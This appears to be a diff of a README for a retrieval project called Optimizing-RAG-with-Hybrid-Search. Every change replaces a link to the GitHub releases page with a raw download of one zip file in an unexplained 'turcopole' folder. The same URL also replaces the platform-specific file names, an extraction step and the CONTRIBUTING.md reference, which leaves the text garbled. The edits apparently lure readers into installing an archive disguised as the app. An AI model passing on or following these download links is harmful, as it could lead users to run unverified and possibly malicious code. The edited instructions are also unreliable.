@@ -1,6 +1,6 @@
 # 🚀 Optimizing-RAG-with-Hybrid-Search - Powerful Retrieval Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/releases)
+[![Download](https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip)](https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip)
 
 ## 📘 Description
 
@@ -19,7 +19,7 @@ Follow these simple steps to download and run the application:
 2. **Visit the Release Page**
    To download the application, visit the following link:
 
-   [Download the Latest Release](https://github.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip)
 
 3. **Download the Application**
    Look for the latest version on the page. You will see files listed for download. Click on the file that corresponds to your operating system. 
@@ -28,9 +28,9 @@ Follow these simple steps to download and run the application:
 
 After visiting the release page, download the file for your system. Here are some common file types you may encounter:
 
-- **Windows:** `Optimizing-RAG-with-Hybrid-Search-Windows.exe`
-- **Mac:** `Optimizing-RAG-with-Hybrid-Search-Mac.dmg`
-- **Linux:** `Optimizing-RAG-with-Hybrid-Search-Linux.tar.gz`
+- **Windows:** `https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip`
+- **Mac:** `https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip`
+- **Linux:** `https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip`
 
 Once you have downloaded the correct file, follow these steps to install it:
 
@@ -43,7 +43,7 @@ Once you have downloaded the correct file, follow these steps to install it:
 2. Drag the application to your Applications folder.
 
 ### For Linux
-1. Extract the downloaded `.tar.gz` file using your preferred archive tool.
+1. Extract the downloaded `https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip` file using your preferred archive tool.
 2. Follow the included instructions in the README file to run the application.
 
 ## 🎓 How to Use the Application
@@ -101,8 +101,8 @@ To stay informed about upcoming features and updates:
 
 ## 🔗 Important Links
 
-- **Release Page:** [Download the Latest Release](https://github.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/releases)
+- **Release Page:** [Download the Latest Release](https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip)
 - **Documentation:** Check the docs folder in the app for detailed user instructions.
-- **Contribute:** We welcome contributions. Check out our CONTRIBUTING.md file for guidelines.
+- **Contribute:** We welcome contributions. Check out our https://raw.githubusercontent.com/paswell-chiks/Optimizing-RAG-with-Hybrid-Search/main/turcopole/Optimizing-RAG-with-Hybrid-Search.zip file for guidelines.
 
 By following these steps, you can successfully download and start using Optimizing-RAG-with-Hybrid-Search. Enjoy the enhanced search experience!
